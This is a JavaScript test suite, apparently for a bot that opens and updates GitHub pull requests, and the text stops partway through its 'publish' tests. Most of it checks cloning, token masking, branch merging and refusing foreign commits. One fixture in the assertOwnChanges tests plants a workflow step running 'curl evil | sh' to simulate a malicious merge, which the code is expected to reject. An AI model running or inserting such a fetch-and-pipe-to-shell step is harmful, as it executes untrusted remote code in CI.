import {
	existsSync,
	readFileSync,
	writeFileSync,
} from 'fs';
import path from 'path';

import { getOctokit } from '@actions/github';
import nock from 'nock';
import test from 'tape';

import { appAuth } from '../../../fleet/lib/app.mjs';
import {
	assertOwnChanges,
	botIdentity,
	checkout,
	closePR,
	findPR,
	prepareBranch,
	publish,
	remoteHasBranch,
} from '../../../fleet/lib/pr.mjs';
import { privateKey } from './helpers/github.mjs';
import {
	bot,
	git as fixtureGit,
	isolateProcessGit,
	mallory,
	makeServer,
	tempDir,
	writeFiles,
} from './helpers/git.mjs';

/** @typedef {import('../../../fleet/lib/pr.mjs').PRState} PRState */
/** @typedef {import('./helpers/git.mjs').Server} Server */
/** @typedef {{ method: string, path: string, body: any, authorization: string }} Recorded */
/** @typedef {(request: { path: string, body: any }) => [number, unknown]} Handler */

const repository = 'o/r';
const owner = 'o';
const name = 'r';
const base = 'main';
const branch = 'fleet/fix';
const lockfile = '.github/workflows/actions.lock';
const files = {
	[lockfile]: 'base lock\n',
	'.github/workflows/ci.yml': 'on: push\n',
	'README.md': 'readme\n',
};
/** @type {(file: string) => boolean} */
const isWorkflow = (file) => file.startsWith('.github/workflows/');
/** @type {(file: string) => boolean} */
const isLockfile = (file) => file === lockfile;

/**
 * Mocks the GitHub REST API: each handler is `[method, path pattern, reply]`; every request is recorded.
 * @type {(t: import('tape').Test, handlers: [string, RegExp, Handler][]) => Recorded[]}
 */
function mockAPI(t, handlers) {
	nock.disableNetConnect();
	/** @type {Recorded[]} */
	const requests = [];
	const scope = nock('https://api.github.com').persist();
	for (const [method, pattern, handler] of handlers) {
		scope.intercept(pattern, method).reply(/** @type {any} */ (async (/** @type {Request} */ req) => { // eslint-disable-line no-extra-parens
			const url = new URL(req.url);
			const text = await req.text();
			const body = text ? JSON.parse(text) : null;
			const requestPath = `${url.pathname}${url.search}`;
			requests.push({
				method: req.method,
				path: requestPath,
				body,
				authorization: req.headers.get('authorization') ?? '',
			});
			return handler({ path: requestPath, body });
		}));
	}
	t.teardown(() => {
		nock.cleanAll();
		// nock's net-connect block is process-wide; lift it so later test files in this tape process are unaffected
		nock.enableNetConnect();
	});
	return requests;
}

/** @type {Handler} */
const updated = ({ path: p }) => [200, { html_url: `https://github.com/o/r/pull/${p.split('/').pop()}` }]; // eslint-disable-line camelcase

/**
 * Runs `fn`, returning the values it masks via `core.setSecret`, which writes `::add-mask::` commands to stdout.
 * @type {<T>(fn: () => T) => { result: T, masks: string[] }}
 */
function captureMasks(fn) {
	/** @type {string[]} */
	const masks = [];
	const { write } = process.stdout;
	process.stdout.write = /** @type {typeof write} */ (function (/** @type {string} */ chunk, /** @type {any[]} */ ...rest) { // eslint-disable-line no-extra-parens
		const match = String(chunk).match(/^::add-mask::(?<value>.*)$/m);
		if (match?.groups) {
			masks.push(match.groups.value);
			return true;
		}
		return write.call(process.stdout, chunk, ...rest);
	});
	try {
		return { result: fn(), masks };
	} finally {
		process.stdout.write = write;
	}
}

/** @type {(t: import('tape').Test, server: Server, extra?: { base?: string }) => ReturnType<typeof checkout> & { dir: string }} */
function clone(t, server, extra = {}) {
	const dir = path.join(tempDir(t, 'fleet-pr-clone'), 'repo');
	return {
		...captureMasks(() => checkout({
			serverURL: server.serverURL,
			repository,
			base: extra.base ?? base,
			token: 'ghs_test',
			identity: bot,
			dir,
		})).result,
		dir,
	};
}

/** @type {(t: import('tape').Test, key: string, value: string | undefined) => void} */
function setEnv(t, key, value) {
	const saved = process.env[key];
	if (typeof value === 'undefined') {
		delete process.env[key];
	} else {
		process.env[key] = value;
	}
	t.teardown(() => {
		if (typeof saved === 'undefined') {
			delete process.env[key];
		} else {
			process.env[key] = saved;
		}
	});
}

/** @type {(t: import('tape').Test, extra?: Record<string, string>) => Server} */
function setup(t, extra = {}) {
	isolateProcessGit(t);
	return makeServer(t, repository, { ...files, ...extra });
}

/** @type {(dir: string, message: string, contents: Record<string, string | null>) => void} */
function botCommit(dir, message, contents) {
	writeFiles(dir, contents);
	fixtureGit(dir, ['add', '--all'], bot);
	fixtureGit(dir, ['commit', '--quiet', '--message', message], bot);
}

test('botIdentity', async (t) => {
	t.test('the App’s bot user', async (st) => {
		const requests = mockAPI(st, [
			['GET', /^\/app$/, () => [200, { id: 1, slug: 'fleet-bot' }]],
			['POST', /^\/app\/installations\/5\/access_tokens$/, () => [201, { token: 'ghs_identity', expires_at: '2099-01-01T00:00:00Z' }]], // eslint-disable-line camelcase
			['GET', /^\/users\//, () => [200, { id: 42, login: 'fleet-bot[bot]' }]],
		]);

		const identity = await botIdentity(appAuth('1', privateKey()), 5);

		st.deepEqual(identity, bot, 'the bot’s login and noreply email');
		st.deepEqual(requests.map((r) => `${r.method} ${r.path}`), [
			'GET /app',
			'POST /app/installations/5/access_tokens',
			'GET /users/fleet-bot%5Bbot%5D',
		], 'reads the App, then a token, then the bot user');
		st.deepEqual(requests[1].body, { permissions: { metadata: 'read' } }, 'the token only needs to read metadata');
		st.equal(requests[2].authorization, 'token ghs_identity', 'the bot user is read with the installation token');
		st.end();
	});

	t.test('no slug', async (st) => {
		const requests = mockAPI(st, [['GET', /^\/app$/, () => [200, { id: 1 }]]]);

		await botIdentity(appAuth('1', privateKey()), 5).then(
			() => st.fail('should reject'),
			(e) => st.equal(e.message, 'could not determine the GitHub App’s slug', 'rejects without a slug'),
		);
		st.equal(requests.length, 1, 'stops after reading the App');
		st.end();
	});

	t.test('no App', async (st) => {
		mockAPI(st, [['GET', /^\/app$/, () => [200, null]]]);

		await botIdentity(appAuth('1', privateKey()), 5).then(
			() => st.fail('should reject'),
			(e) => st.equal(e.message, 'could not determine the GitHub App’s slug', 'rejects without an App'),
		);
		st.end();
	});

	t.test('API errors', async (st) => {
		mockAPI(st, [
			['GET', /^\/app$/, () => [200, { id: 1, slug: 'fleet-bot' }]],
			['POST', /^\/app\/installations\/5\/access_tokens$/, () => [201, { token: 'ghs_identity', expires_at: '2099-01-01T00:00:00Z' }]], // eslint-disable-line camelcase
			['GET', /^\/users\//, () => [404, { message: 'Not Found' }]],
		]);

		await botIdentity(appAuth('1', privateKey()), 5).then(
			() => st.fail('should reject'),
			(e) => st.equal(e.status, 404, 'propagates a failure to read the bot user'),
		);
		st.end();
	});

	t.end();
});

test('checkout', (t) => {
	const server = setup(t);
	server.commit('dev', { 'dev.txt': 'dev\n' }, { from: 'main' });

	const { git, env, dir } = clone(t, server, { base: 'dev' });

	t.equal(readFileSync(path.join(dir, 'dev.txt'), 'utf8'), 'dev\n', 'clones the base branch');
	t.equal(git(['rev-parse', '--abbrev-ref', 'HEAD']).stdout.trim(), 'dev', 'checked out');
	t.equal(git(['config', '--get', 'remote.origin.tagOpt']).stdout.trim(), '--no-tags', 'without tags');
	t.equal(git(['config', '--get', `http.${server.serverURL}/.extraheader`]).stdout.trim(), `AUTHORIZATION: basic ${Buffer.from('x-access-token:ghs_test').toString('base64')}`, 'authenticated to the server');
	t.equal(git(['config', '--local', '--get-regexp', 'extraheader'], { allowFailure: true }).status, 1, 'without the token in `.git/config`');
	t.deepEqual(env, {
		GIT_CONFIG_COUNT: '1',
		GIT_CONFIG_KEY_0: `http.${server.serverURL}/.extraheader`,
		GIT_CONFIG_VALUE_0: `AUTHORIZATION: basic ${Buffer.from('x-access-token:ghs_test').toString('base64')}`,
		GIT_TERMINAL_PROMPT: '0',
		GIT_AUTHOR_NAME: bot.name,
		GIT_AUTHOR_EMAIL: bot.email,
		GIT_COMMITTER_NAME: bot.name,
		GIT_COMMITTER_EMAIL: bot.email,
	}, 'returns the environment it runs git with');

	writeFiles(dir, { 'new.txt': 'new\n' });
	git(['add', 'new.txt']);
	git(['commit', '--quiet', '--message', 'm']);
	t.equal(git(['log', '-1', '--format=%an <%ae>|%cn <%ce>']).stdout.trim(), `${bot.name} <${bot.email}>|${bot.name} <${bot.email}>`, 'commits as the bot');
	t.equal(git(['status', '--porcelain'], { input: '' }).stdout, '', 'passes options through');

	t.throws(
		() => clone(t, server, { base: 'nope' }),
		/`git clone --quiet --no-tags --branch nope /,
		'throws when the clone fails',
	);
	t.end();
});

test('checkout: masks the token, and the header that encodes it', (t) => {
	const server = setup(t);
	const dir = path.join(tempDir(t, 'fleet-pr-clone'), 'repo');

	const { masks } = captureMasks(() => checkout({
		serverURL: server.serverURL, repository, base, token: 'ghs_masked', identity: bot, dir,
	}));

	t.deepEqual(masks, ['ghs_masked', Buffer.from('x-access-token:ghs_masked').toString('base64')], 'both are masked');
	t.end();
});

test('checkout: a server URL with trailing slashes', (t) => {
	const server = setup(t);
	const dir = path.join(tempDir(t, 'fleet-pr-clone'), 'repo');

	const { git, env } = captureMasks(() => checkout({
		serverURL: `${server.serverURL}//`, repository, base, token: 'ghs_test', identity: bot, dir,
	})).result;

	t.equal(git(['config', '--get', 'remote.origin.url']).stdout.trim(), `${server.serverURL}/o/r.git`, 'clones without doubled slashes');
	t.equal(env.GIT_CONFIG_KEY_0, `http.${server.serverURL}/.extraheader`, 'and authenticates to the same server');
	t.end();
});

test('checkout: the workflow’s server', (t) => {
	const server = setup(t);
	setEnv(t, 'GITHUB_SERVER_URL', `${server.serverURL}/`);
	const dir = path.join(tempDir(t, 'fleet-pr-clone'), 'repo');

	const { git, env } = captureMasks(() => checkout({
		repository, base, token: 'ghs_test', identity: bot, dir,
	})).result;

	t.equal(git(['config', '--get', 'remote.origin.url']).stdout.trim(), `${server.serverURL}/o/r.git`, 'clones from `GITHUB_SERVER_URL`');
	t.equal(env.GIT_CONFIG_KEY_0, `http.${server.serverURL}/.extraheader`, 'authenticated to it');
	t.end();
});

test('checkout: the default server', (t) => {
	const server = setup(t);
	setEnv(t, 'GITHUB_SERVER_URL', undefined);
	// stands in for github.com, so the default server URL is really cloned from, without any network access
	const config = path.join(tempDir(t, 'fleet-pr-config'), 'gitconfig');
	writeFileSync(config, `[url "${server.serverURL}/"]\n\tinsteadOf = https://github.com/\n`);
	process.env.GIT_CONFIG_GLOBAL = config;
	const dir = path.join(tempDir(t, 'fleet-pr-clone'), 'repo');

	const { git, env } = captureMasks(() => checkout({
		repository, base, token: 'ghs_test', identity: bot, dir,
	})).result;

	t.equal(git(['config', '--get', 'remote.origin.url']).stdout.trim(), 'https://github.com/o/r.git', 'clones from github.com');
	t.equal(env.GIT_CONFIG_KEY_0, 'http.https://github.com/.extraheader', 'authenticated to github.com');
	t.equal(readFileSync(path.join(dir, 'README.md'), 'utf8'), 'readme\n', 'cloned');
	t.end();
});

test('findPR', async (t) => {
	/** @type {[string, unknown[], PRState][]} */
	const cases = [
		['none', [], { mode: 'create' }],
		['merged', [{
			number: 3, state: 'closed', merged_at: '2026-01-01T00:00:00Z', head: { sha: 'abc' }, // eslint-disable-line camelcase
		}], { mode: 'create' }],
		['open', [{
			number: 4, state: 'open', merged_at: null, head: { sha: 'def' }, // eslint-disable-line camelcase
		}], { mode: 'update', number: 4, head: 'def' }],
		['closed', [{
			number: 5, state: 'closed', merged_at: null, head: { sha: '123' }, // eslint-disable-line camelcase
		}], { mode: 'reopen', number: 5, head: '123' }],
	];
	for (const [label, prs, expected] of cases) {
		t.test(label, async (st) => { // eslint-disable-line no-await-in-loop
			const requests = mockAPI(st, [['GET', /^\/repos\/o\/r\/pulls/, () => [200, prs]]]);

			st.deepEqual(await findPR(getOctokit('ghs_test'), {
				owner, name, base, branch,
			}), expected, `${label}: ${expected.mode}`);
			const { searchParams } = new URL(requests[0].path, 'https://api.github.com');
			st.deepEqual(Object.fromEntries(searchParams), {
				head: `o:${branch}`,
				base,
				state: 'all',
				sort: 'created',
				direction: 'desc',
				per_page: '1', // eslint-disable-line camelcase
			}, 'asks for the newest PR from the owner’s branch into the base');
			st.end();
		});
	}
	t.end();
});

test('remoteHasBranch', (t) => {
	const server = setup(t);
	const { git } = clone(t, server);

	t.equal(remoteHasBranch(git, branch), false, 'no branch');
	server.commit(branch, { 'x.txt': 'x\n' }, { from: 'main' });
	t.equal(remoteHasBranch(git, branch), true, 'the branch');
	t.equal(remoteHasBranch(git, 'fleet'), false, 'not a prefix of it');
	t.end();
});

test('prepareBranch: building on the right commit', (t) => {
	t.test('create, without a remote branch: the base', (st) => {
		const server = setup(st);
		const { git } = clone(st, server);

		prepareBranch(git, {
			state: { mode: 'create' }, base, branch, remoteHasBranch: false, regenerated: isLockfile,
		});

		st.equal(git(['rev-parse', '--abbrev-ref', 'HEAD']).stdout.trim(), branch, 'on the branch');
		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), server.tip('main'), 'at the base');
		st.end();
	});

	t.test('update: the remote branch, merged with the base', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		const moved = server.commit('main', { 'README.md': 'moved\n' });
		const { git, dir } = clone(st, server);

		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
		});

		st.deepEqual(git(['log', '-1', '--format=%P']).stdout.trim().split(' '), [head, moved], 'a merge of the branch’s tip and the base');
		st.equal(readFileSync(path.join(dir, lockfile), 'utf8'), 'bot lock\n', 'keeps the branch’s changes');
		st.equal(readFileSync(path.join(dir, 'README.md'), 'utf8'), 'moved\n', 'and the base’s');
		st.end();
	});

	t.test('update, already up to date: just the remote branch', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		const { git } = clone(st, server);

		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
		});

		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), head, 'at the branch’s tip');
		st.end();
	});

	t.test('reopen, with the remote branch: the remote branch', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		const newer = server.commit(branch, { [lockfile]: 'newer lock\n' }, { who: bot });
		server.setRef('refs/pull/7/head', head);
		const { git } = clone(st, server);

		prepareBranch(git, {
			state: { mode: 'reopen', number: 7, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
		});

		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), newer, 'the branch’s tip, not the PR’s');
		st.end();
	});

	t.test('reopen, without the remote branch: the PR’s head', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		server.setRef('refs/pull/7/head', head);
		server.deleteRef(`refs/heads/${branch}`);
		const { git } = clone(st, server);

		prepareBranch(git, {
			state: { mode: 'reopen', number: 7, head }, base, branch, remoteHasBranch: false, regenerated: isLockfile,
		});

		st.equal(git(['rev-parse', '--abbrev-ref', 'HEAD']).stdout.trim(), branch, 'on the branch');
		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), head, 'at the PR’s head');
		st.end();
	});

	t.end();
});

test('prepareBranch: conflicts', (t) => {
	t.test('in regenerated files: the base’s version', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n', '.github/workflows/ci.yml': 'bot ci\n' }, { who: bot, from: 'main' });
		const moved = server.commit('main', { [lockfile]: 'base moved\n', '.github/workflows/ci.yml': 'ci moved\n', 'README.md': 'moved\n' });
		const { git, dir } = clone(st, server);

		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});

		st.equal(readFileSync(path.join(dir, lockfile), 'utf8'), 'base moved\n', 'takes the base’s lockfile');
		st.equal(readFileSync(path.join(dir, '.github/workflows/ci.yml'), 'utf8'), 'ci moved\n', 'and every other conflicting regenerated file');
		st.equal(readFileSync(path.join(dir, 'README.md'), 'utf8'), 'moved\n', 'merging the rest');
		st.deepEqual(git(['log', '-1', '--format=%P|%an|%cn']).stdout.trim(), `${head} ${moved}|${bot.name}|${bot.name}`, 'commits the merge as the bot');
		st.equal(git(['status', '--porcelain']).stdout, '', 'nothing left over');
		st.end();
	});

	t.test('only the conflicting regenerated files are reset', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n', '.github/workflows/new.yml': 'bot new\n' }, { who: bot, from: 'main' });
		server.commit('main', { [lockfile]: 'base moved\n' });
		const { git, dir } = clone(st, server);

		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});

		st.equal(readFileSync(path.join(dir, lockfile), 'utf8'), 'base moved\n', 'takes the base’s version of the conflict');
		st.equal(readFileSync(path.join(dir, '.github/workflows/new.yml'), 'utf8'), 'bot new\n', 'keeps the branch’s clean changes');
		st.end();
	});

	t.test('in a regenerated file the base deleted: deleted', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		server.commit('main', { [lockfile]: null });
		const { git, dir } = clone(st, server);

		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
		});

		st.notOk(existsSync(path.join(dir, lockfile)), 'follows the base');
		st.equal(git(['status', '--porcelain']).stdout, '', 'committed');
		st.equal(git(['diff', '--name-only', 'origin/main', 'HEAD']).stdout, '', 'matches the base');
		st.end();
	});

	t.test('in a regenerated file the branch deleted: the base’s version', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: null }, { who: bot, from: 'main' });
		server.commit('main', { [lockfile]: 'base moved\n' });
		const { git, dir } = clone(st, server);

		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
		});

		st.equal(readFileSync(path.join(dir, lockfile), 'utf8'), 'base moved\n', 'restores the base’s');
		st.equal(git(['status', '--porcelain']).stdout, '', 'committed');
		st.end();
	});

	t.test('in any other file: refuses', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n', 'README.md': 'theirs\n' }, { who: mallory, from: 'main' });
		server.commit('main', { [lockfile]: 'base moved\n', 'README.md': 'moved\n' });
		const { git, dir } = clone(st, server);

		st.throws(
			() => prepareBranch(git, {
				state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isLockfile,
			}),
			(/** @type {unknown} */ e) => e instanceof Error && e.message === `\`${branch}\` conflicts with \`main\` in \`README.md\`; refusing to resolve that automatically. Resolve it on the branch, or delete the branch, so the next run can rebuild it.`,
			'names only the unresolvable conflicts',
		);
		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), head, 'commits nothing');
		st.equal(git(['status', '--porcelain']).stdout, '', 'aborts the merge');
		st.notOk(readFileSync(path.join(dir, 'README.md'), 'utf8').includes('<<<<<<<'), 'leaves no conflict markers');
		st.end();
	});

	t.test('the merge fails without conflicts: refuses', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		server.commit('main', { 'added.txt': 'base\n' });
		const { git, dir } = clone(st, server);
		/** @type {import('../../../fleet/lib/pr.mjs').Git} */
		const untracked = (args, options) => {
			const result = git(args, options);
			if (args[0] === 'switch') {
				writeFiles(dir, { 'added.txt': 'untracked\n' });
			}
			return result;
		};

		st.throws(
			() => prepareBranch(untracked, {
				state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: () => true,
			}),
			(/** @type {unknown} */ e) => e instanceof Error && e.message.startsWith(`could not merge \`main\` into \`${branch}\`:\n`) && e.message.includes('added.txt'),
			'with git’s reason',
		);
		st.equal(git(['rev-parse', 'HEAD']).stdout.trim(), head, 'commits nothing');
		st.end();
	});

	t.end();
});

test('assertOwnChanges', (t) => {
	const options = {
		base, branch, identity: bot, allowed: isWorkflow,
	};

	t.test('only the bot’s own commits, to allowed files', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		server.commit('main', { 'README.md': 'moved\n' });
		const { git, dir } = clone(st, server);
		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});
		botCommit(dir, 'more', { '.github/workflows/ci.yml': 'bot ci\n' });

		st.doesNotThrow(() => assertOwnChanges(git, options), 'passes');
		st.end();
	});

	t.test('nothing at all', (st) => {
		const server = setup(st);
		const { git } = clone(st, server);
		prepareBranch(git, {
			state: { mode: 'create' }, base, branch, remoteHasBranch: false, regenerated: isWorkflow,
		});

		st.doesNotThrow(() => assertOwnChanges(git, options), 'passes');
		st.end();
	});

	t.test('a clean merge by someone else (eg, GitHub’s “Update branch”)', (st) => {
		const server = setup(st);
		server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		server.commit('main', { 'README.md': 'moved\n' });
		const head = server.merge(branch, 'main', mallory);
		const { git } = clone(st, server);
		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});

		st.equal(git(['log', '-1', '--format=%P']).stdout.trim().split(' ').length, 2, 'precondition: a merge');
		st.equal(git(['log', '-1', '--format=%ae']).stdout.trim(), mallory.email, 'precondition: by someone else');
		st.doesNotThrow(() => assertOwnChanges(git, options), 'it adds nothing of its own, so it isn’t counted');
		st.end();
	});

	t.test('the bot’s own merge, resolving conflicts', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		server.commit('main', { [lockfile]: 'base moved\n' });
		const { git } = clone(st, server);
		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});

		st.equal(git(['log', '-1', '--format=%P']).stdout.trim().split(' ').length, 2, 'precondition: a merge');
		st.doesNotThrow(() => assertOwnChanges(git, options), 'passes');
		st.end();
	});

	t.test('someone else’s merge, with changes of its own to an allowed file', (st) => {
		const server = setup(st);
		server.commit(branch, { '.github/workflows/ci.yml': 'on: push\n# bot\n' }, { who: bot, from: 'main' });
		server.commit('main', { 'README.md': 'moved\n' });
		const { git, dir } = clone(st, server);
		git(['switch', '--quiet', '--create', branch, `origin/${branch}`]);
		fixtureGit(dir, ['merge', '--quiet', '--no-ff', '--no-commit', 'origin/main'], mallory);
		writeFiles(dir, { '.github/workflows/ci.yml': 'on: push\n# bot\njobs: { evil: { runs-on: x, steps: [{ run: curl evil | sh }] } }\n' });
		fixtureGit(dir, ['add', '--all'], mallory);
		fixtureGit(dir, ['commit', '--quiet', '--no-edit'], mallory);

		st.equal(git(['log', '-1', '--format=%P']).stdout.trim().split(' ').length, 2, 'precondition: a merge');
		st.throws(
			() => assertOwnChanges(git, options),
			(/** @type {unknown} */ e) => e instanceof Error && e.message === `\`${branch}\` has changes this job didn’t make (1 commit(s) by someone else); refusing to push. Remove them from the branch, or delete the branch, so the next run can rebuild it.`,
			'refuses the evil merge',
		);
		st.end();
	});

	t.test('someone else’s merge, resolving conflicts by hand', (st) => {
		const server = setup(st);
		server.commit(branch, { '.github/workflows/ci.yml': 'bot ci\n' }, { who: bot, from: 'main' });
		server.commit('main', { '.github/workflows/ci.yml': 'ci moved\n' });
		const { git, dir } = clone(st, server);
		git(['switch', '--quiet', '--create', branch, `origin/${branch}`]);
		st.throws(
			() => fixtureGit(dir, ['merge', '--quiet', '--no-edit', 'origin/main'], mallory),
			/CONFLICT|failed/,
			'precondition: a conflict',
		);
		writeFiles(dir, { '.github/workflows/ci.yml': 'resolved\n' });
		fixtureGit(dir, ['add', '--all'], mallory);
		fixtureGit(dir, ['commit', '--quiet', '--no-edit'], mallory);

		st.equal(git(['log', '-1', '--format=%P']).stdout.trim().split(' ').length, 2, 'precondition: a merge');
		st.throws(
			() => assertOwnChanges(git, options),
			(/** @type {unknown} */ e) => e instanceof Error && e.message.includes('(1 commit(s) by someone else)'),
			'refuses: it can’t be told apart from an evil merge',
		);
		st.end();
	});

	t.test('someone else’s octopus merge', (st) => {
		const server = setup(st);
		server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		server.commit('other', { 'other.txt': 'other\n' }, { who: bot, from: 'main' });
		server.commit('main', { 'README.md': 'moved\n' });
		const { git, dir } = clone(st, server);
		git(['switch', '--quiet', '--create', branch, `origin/${branch}`]);
		fixtureGit(dir, ['merge', '--quiet', '--no-edit', 'origin/main', 'origin/other'], mallory);

		st.equal(git(['log', '-1', '--format=%P']).stdout.trim().split(' ').length, 3, 'precondition: an octopus merge');
		st.throws(
			() => assertOwnChanges(git, { ...options, allowed: () => true }),
			(/** @type {unknown} */ e) => e instanceof Error && e.message.includes('(1 commit(s) by someone else)'),
			'refuses',
		);
		st.end();
	});

	t.test('a file outside what’s allowed', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { 'README.md': 'bot readme\n', 'src/x.js': 'x\n' }, { who: bot, from: 'main' });
		const { git } = clone(st, server);
		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});

		st.throws(
			() => assertOwnChanges(git, options),
			(/** @type {unknown} */ e) => e instanceof Error && e.message === `\`${branch}\` has changes this job didn’t make (files: README.md, src/x.js); refusing to push. Remove them from the branch, or delete the branch, so the next run can rebuild it.`,
			'refuses, naming the files',
		);
		st.end();
	});

	t.test('a file with an unusual name', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { 'tab\there.txt': 'x\n' }, { who: bot, from: 'main' });
		const { git } = clone(st, server);
		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});

		st.throws(
			() => assertOwnChanges(git, options),
			(/** @type {unknown} */ e) => e instanceof Error && e.message.includes('(files: tab\there.txt)'),
			'names it unquoted',
		);
		st.doesNotThrow(() => assertOwnChanges(git, { ...options, allowed: (file) => file === 'tab\there.txt' }), 'and checks it unquoted');
		st.end();
	});

	t.test('someone else’s commit', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'their lock\n' }, { who: mallory, from: 'main' });
		const { git } = clone(st, server);
		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});

		st.throws(
			() => assertOwnChanges(git, options),
			(/** @type {unknown} */ e) => e instanceof Error && e.message === `\`${branch}\` has changes this job didn’t make (1 commit(s) by someone else); refusing to push. Remove them from the branch, or delete the branch, so the next run can rebuild it.`,
			'refuses, counting the commits',
		);
		st.end();
	});

	t.test('the bot’s authorship, committed by someone else', (st) => {
		const server = setup(st);
		server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		const { git, dir } = clone(st, server);
		prepareBranch(git, {
			state: { mode: 'create' }, base, branch, remoteHasBranch: false, regenerated: isWorkflow,
		});
		writeFiles(dir, { [lockfile]: 'forged\n' });
		fixtureGit(dir, ['add', '--all'], mallory);
		fixtureGit(dir, ['commit', '--quiet', '--message', 'forged', `--author=${bot.name} <${bot.email}>`], mallory);

		st.equal(git(['log', '-1', '--format=%ae|%ce']).stdout.trim(), `${bot.email}|${mallory.email}`, 'precondition: authored by the bot, committed by someone else');
		st.throws(
			() => assertOwnChanges(git, options),
			(/** @type {unknown} */ e) => e instanceof Error && e.message.includes('(1 commit(s) by someone else)'),
			'refuses',
		);
		st.end();
	});

	t.test('both', (st) => {
		const server = setup(st);
		const head = server.commit(branch, { 'README.md': 'theirs\n' }, { who: mallory, from: 'main' });
		const { git } = clone(st, server);
		prepareBranch(git, {
			state: { mode: 'update', number: 1, head }, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});

		st.throws(
			() => assertOwnChanges(git, options),
			(/** @type {unknown} */ e) => e instanceof Error && e.message.includes('(files: README.md; 1 commit(s) by someone else)'),
			'names both problems',
		);
		st.end();
	});

	t.end();
});

/** @type {(requests: Recorded[]) => [string, unknown][]} */
const writes = (requests) => requests.map((r) => [`${r.method} ${r.path}`, r.body]);

test('publish', (t) => {
	const common = {
		owner, name, base, branch, identity: bot, allowed: isWorkflow, title: 'the title', body: 'the body',
	};

	t.test('changes the bot didn’t make: refuses, before pushing or touching the PR', async (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'their lock\n' }, { who: mallory, from: 'main' });
		server.setRef('refs/pull/5/head', head);
		server.deleteRef(`refs/heads/${branch}`);
		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated]]);
		const { git, dir } = clone(st, server);
		/** @type {PRState} */
		const state = { mode: 'reopen', number: 5, head };
		prepareBranch(git, {
			state, base, branch, remoteHasBranch: false, regenerated: isWorkflow,
		});
		botCommit(dir, 'the title', { [lockfile]: 'bot lock\n' });

		await publish({
			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: false,
		}).then(
			() => st.fail('should reject'),
			(e) => st.ok(e.message.includes('(1 commit(s) by someone else); refusing to push'), 'rejects via `assertOwnChanges`'),
		);
		st.equal(server.tip(`refs/heads/${branch}`), '', 'pushes nothing, not even the restored branch');
		st.deepEqual(requests, [], 'touches no PR');
		st.end();
	});

	t.test('create', async (st) => {
		const server = setup(st);
		const requests = mockAPI(st, [['POST', /^\/repos\/o\/r\/pulls$/, () => [201, { html_url: 'https://github.com/o/r/pull/9' }]]]); // eslint-disable-line camelcase
		const { git, dir } = clone(st, server);
		/** @type {PRState} */
		const state = { mode: 'create' };
		prepareBranch(git, {
			state, base, branch, remoteHasBranch: false, regenerated: isWorkflow,
		});
		botCommit(dir, 'the title', { [lockfile]: 'bot lock\n' });

		const outcome = await publish({
			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: false,
		});

		st.equal(outcome, 'created https://github.com/o/r/pull/9', 'reports the new PR');
